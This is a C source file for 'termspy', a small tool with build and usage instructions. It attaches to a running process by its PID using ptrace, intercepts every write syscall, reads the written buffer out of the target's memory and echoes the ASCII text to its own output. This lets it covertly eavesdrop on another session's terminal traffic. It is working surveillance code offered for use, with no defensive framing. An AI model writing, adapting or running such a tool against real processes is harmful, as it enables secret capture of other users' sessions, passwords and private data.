/* 
termspy

gcc termspy.c -o termspy
./termspy <pid>
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/reg.h>
#include <sys/syscall.h>
#include <stdlib.h>
#include <sys/uio.h>

const int long_size = sizeof(long);

void getdata(pid_t child, long addr, char *str, int len)
{
    char *laddr;
    int i, j;
    union u
    {
        long val;
        char chars[long_size];
    } data;
    i = 0;
    j = len / long_size;
    laddr = str;
    while (i < j)
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 8, NULL);
        memcpy(laddr, data.chars, long_size);
        ++i;
        laddr += long_size;
    }
    j = len % long_size;
    if (j != 0)
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 8, NULL);
        memcpy(laddr, data.chars, j);
    }
    str[len] = '\0';
}

int main(int argc, char *argv[])
{
    pid_t pid;
    long params[3];
    char *str, *laddr;
    long orig_eax, eax;
    int c, invalid_text;
    int insyscall = 0;

    if (argc != 2)
    {
        printf("usage: ./termspy <pid>\n");
        exit(1);
    }
    pid = atoi(argv[1]);

    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1)
    {
        perror("error attaching to process");
        exit(1);
    }
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_SYSCALL, pid, 0, 0);
    
    while (1)
    {
        int status;
        waitpid(pid, &status, 0);
        if (WIFEXITED(status))
        {
            printf("%d exited!\n", pid);
            break;
        }
        orig_eax = ptrace(PTRACE_PEEKUSER, pid, 8 * ORIG_RAX, NULL);

        if (orig_eax == SYS_write)
        {
            if (insyscall == 0)
            {
                insyscall = 1;
                params[0] = ptrace(PTRACE_PEEKUSER, pid, 8 * RDI, NULL);
                params[1] = ptrace(PTRACE_PEEKUSER, pid, 8 * RSI, NULL);
                params[2] = ptrace(PTRACE_PEEKUSER, pid, 8 * RDX, NULL);

                str = (char *)calloc((params[2] + 1), sizeof(char));

                getdata(pid, params[1], str, params[2]);

                invalid_text = 0;
                for (c=0; c<= strlen(str); c++)
                {
                    // only capture ascii characters
                    if ((str[c] < 0) || (str[c] >= 255))
                    {
                        invalid_text = 1;
                        break;
                    }
                    // sub CR with LF
                    if (str[c] == 13)
                        str[c] = '\n';
                }

                if (invalid_text == 0)
                    write(1, str, strlen(str));
                free(str);
            }
            else
            {
                eax = ptrace(PTRACE_PEEKUSER, pid, 8 * RAX, NULL);
                insyscall = 0;
            }
        }
        ptrace(PTRACE_SYSCALL, pid, 0, 0);
    }
    return 0;
}
